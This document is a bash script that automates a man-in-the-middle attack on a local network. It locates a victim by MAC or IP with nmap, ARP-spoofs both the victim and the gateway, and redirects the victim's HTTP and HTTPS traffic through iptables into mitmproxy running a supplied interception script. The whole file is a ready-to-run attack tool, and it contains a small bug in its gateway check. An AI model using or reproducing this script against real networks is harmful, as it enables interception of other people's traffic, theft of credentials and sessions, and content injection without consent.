#!/bin/bash

if [ "$(id -u)" != "0" ]; then
	echo "Run it as root."
	exit 1
fi

if [ $# -ne 3 ]; then
	echo "Usage: $0 <interface> <MAC or IP Address> <path to mitmproxy script>"
	exit 2
fi

IFACE=$(echo $1)
GATEWAY=$(ip r | grep $IFACE | grep default | awk '{print $3}')
LOCALNET=$(ip r | grep $IFACE | grep src | awk '{print $1}')

if [ -z "GATEWAY" -o -z "$LOCALNET" ]; then
	echo "Could not find Localnet IP range or Gateway IP"
	echo "Is $IFACE connected to the Internet?"
	exit 3
fi

IP=
MESSAGE=
if [ ${#2} -eq 17 ]; then
	echo "MAC Address given, will try to find IP."
	IP=$(nmap -sP -T 4 $LOCALNET | grep -i -B 2 $2 | grep -o -E [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)
	MESSAGE="MAC: $2 - $IP"

	if [ -z "$IP" ]; then
		echo "Could not find the IP Address from the MAC, sorry :("
		exit 4
	fi
else
	echo "IP Address given."
	IP=$(echo $2)
	MESSAGE="IP: $2"

	if [ -z "$(sudo nmap -sP -T 4 $IP | grep 'Host is up')" ]; then
		echo "Could not find $IP on this network, is it online?";
		exit 4
	fi
fi

if [ ! -f "$3" ]; then
	echo "Script $3 not found."
	exit 5
fi

echo "Starting mitmproxy for $MESSAGE"

echo "1" > /proc/sys/net/ipv4/ip_forward
xterm -T 'ARP Spoof -> Gateway' -e "arpspoof -i $IFACE -t $IP $GATEWAY" &
xterm -T 'ARP Spoof -> Target'  -e "arpspoof -i $IFACE -t $GATEWAY $IP" &

iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 443 -j REDIRECT --to-port 8080

mitmproxy -T --host -p 8080 --anticache -s "$3"

iptables -t nat -D PREROUTING -i $IFACE -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -D PREROUTING -i $IFACE -p tcp --dport 443 -j REDIRECT --to-port 8080
pkill -SIGINT arpspoof
echo "0" > /proc/sys/net/ipv4/ip_forward

exit 0

#		Dependencies: sudo apt-get install dsniff nmap python2.7-dev python-pip; sudo pip install mitmproxy